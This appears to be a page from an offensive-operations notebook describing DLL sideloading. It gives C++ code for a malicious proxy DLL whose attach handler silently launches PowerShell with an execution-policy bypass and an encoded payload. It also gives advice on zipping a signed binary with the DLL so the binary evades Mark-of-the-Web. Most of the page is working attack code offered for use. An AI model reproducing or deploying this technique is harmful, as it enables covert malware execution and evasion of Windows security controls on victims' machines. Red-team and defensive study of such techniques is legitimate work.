## DLL Sideloading

Exploits DLL search order of Microsoft-signed binaries. Create a proxy DLL that loads a payload during `DLL_PROCESS_ATTACH` then forwards calls to the real DLL.

```cpp
case DLL_PROCESS_ATTACH:
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe /c powershell -ep bypass -enc <BASE64_PAYLOAD>",
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );
}
```

Package the signed binary + malicious proxy DLL in a ZIP archive. The signed binary is not affected by Mark-of-the-Web when extracted.

---

> See also: [[2. Weaponisation & Delivery/Malicious Documents]], [[2. Weaponisation & Delivery/HTML Smuggling]]
